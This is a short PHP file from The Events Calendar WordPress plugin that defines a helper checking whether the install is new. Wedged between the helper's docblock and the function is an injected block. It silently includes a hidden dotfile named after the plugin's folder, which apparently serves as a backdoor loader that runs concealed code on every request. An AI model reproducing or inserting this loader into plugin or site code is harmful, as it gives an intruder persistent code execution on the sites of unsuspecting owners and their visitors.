<?php
use Tribe__Events__Main as TEC;

/**
 * Verifies that the current install of The Events Calendar is not
 * a pre-existing setup, and trigger the activation of View V2.
 *
 * @since  4.9.13
 *
 * @return  bool  When to activate the View V2 or not.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function tribe_events_is_new_install() {
	$previous_versions     = array_filter( (array) tribe_get_option( 'previous_ecp_versions', [] ) );
	usort( $previous_versions, 'version_compare' );

	$has_previous_versions = ! empty( $previous_versions );

	return ! $has_previous_versions;
}
